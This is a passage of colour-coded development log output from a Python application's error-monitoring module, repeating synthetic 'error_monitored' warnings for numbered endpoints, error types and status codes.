WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856302Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3138'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856353Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3139'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856403Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3140'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856456Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3141'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856507Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3142'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856556Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3143'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856606Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3144'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856656Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3145'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856705Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3146'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856754Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3147'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856802Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3148'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856849Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3149'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856898Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3150'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856947Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3151'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856995Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3152'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857043Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3153'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857091Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3154'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857139Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3155'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857187Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3156'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857234Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3157'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857281Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3158'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857329Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3159'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857376Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3160'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857471Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3161'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857560Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3162'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857620Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3163'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857673Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3164'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857761Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3165'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857836Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3166'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857899Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3167'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.857951Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3168'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858002Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3169'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858051Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3170'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858100Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3171'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858148Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3172'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858199Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3173'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858256Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3174'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858304Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3175'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858353Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3176'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858401Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3177'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
